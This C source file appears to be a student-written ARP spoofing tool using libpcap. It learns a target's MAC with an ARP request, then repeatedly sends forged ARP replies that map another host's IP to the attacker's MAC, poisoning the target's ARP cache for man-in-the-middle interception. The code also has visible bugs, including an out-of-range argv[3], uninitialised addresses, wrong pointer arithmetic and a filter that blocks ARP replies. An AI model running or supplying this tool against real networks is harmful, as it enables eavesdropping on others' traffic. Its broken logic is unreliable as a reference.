#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>

struct _ether_header{
  	unsigned char ether_dhost[ETH_ALEN];	
  	unsigned char ether_shost[ETH_ALEN];
 	short ether_type;		        
};

struct arp_header{
	unsigned short int HW_type;
	unsigned short int PT_type;
    unsigned char HW_size;
    unsigned char PT_size;
	unsigned short int OPcode;
	unsigned char Send_Mac[ETH_ALEN];
	struct in_addr Send_IP;
	unsigned char Target_Mac[ETH_ALEN];
	struct in_addr Target_IP;
};

u_char global_mac[6];

void make_arp(u_char* packet,char *dest_mac,in_addr_t dest_ip,char *source_mac,in_addr_t source_ip,int opcode){
	int ether_arp = 0x0608;
	int arp_proto = 0x0008;
	int HW_eth = 0x0100;
	int HW_size = 0x06;
	int PT_size = 0x04;
	int i;
	memset(packet,0x00,1000);

	memcpy(packet,dest_mac,6);
	memcpy(packet+6,source_mac,6);
	memcpy(packet+12,&(ether_arp),2);
	memcpy(packet+14,&(HW_eth),2);
	memcpy(packet+16,&(arp_proto),2);
	memcpy(packet+18,&(HW_size),1);
	memcpy(packet+19,&(PT_size),1);
	memcpy(packet+20,&(opcode),2);
	memcpy(packet+22,source_mac,6);
	memcpy(packet+28,&(source_ip),4);
	if(strcmp(dest_mac,global_mac))
		memcpy(packet+32,dest_mac,6);
	memcpy(packet+38,&(dest_ip),4);

}

void print_packet(const u_char *packet_data){
	int i;
	for(i=0;i<42;i++){
		if(i%16 == 0)
			printf("\n");
		printf("%02x ", packet_data[i]);
	}	
	printf("\n");
}


int main(int argc,char *argv[]){
	char errbuf[PCAP_ERRBUF_SIZE];
	char filter_exp[] = "port 80";
	u_int32_t packet_rev;
	const u_char *packet_data = 0;
	struct pcap_pkthdr *header;
	u_char packet[1000];
	struct arp_header *ah;
	struct _ether_header *eh;
	struct bpf_program fp;
	bpf_u_int32 mask;
	bpf_u_int32 net;
	pcap_t *handle;

	struct ifreq s;

	struct in_addr my_addr;
	struct in_addr send_addr;
	struct in_addr tar_addr;	
	char my_mac[6];
	char send_mac[6];
	char target_mac[6];


	char *dev;
	int fd,i;

	if(argc < 3){
		printf("[*]plz input : target_ip sender_ip\n");
		exit(1);
	}

	dev = argv[1];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}	
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    	
	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_name, argv[1]);
	if (ioctl(fd, SIOCGIFHWADDR, &s) != 0 ){
		fprintf(stderr, "error\n");
		return 0;
	}

	memcpy(my_mac,s.ifr_addr.sa_data,6);
	memset(global_mac,0xFF,6);
	memset(packet,0x00,1000);

	/* add get my ip*/

	inet_pton(AF_INET, argv[2], &send_addr.s_addr);
	inet_pton(AF_INET, argv[3], &tar_addr.s_addr);
	
	make_arp(packet,global_mac,tar_addr.s_addr,my_mac,my_addr.s_addr,0x0100);
	pcap_sendpacket(handle,packet,42);

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	packet_rev = pcap_next_ex(handle, &header, &packet_data);		

	eh = (struct _ether_header*)(packet_data);
	ah = (struct arp_header*)(packet_data+14);
	if(ntohs(eh->ether_type) == ETHERTYPE_ARP){
		memcpy(target_mac,eh+6,6);
		print_packet(packet_data);
	}

	make_arp(packet,target_mac,tar_addr.s_addr,my_mac,send_addr.s_addr,0x0200);
	while(1){
		pcap_sendpacket(handle,packet,42);
		sleep(1);
	}

}

// mac : 00:0c:29:62:3b:43 , ens33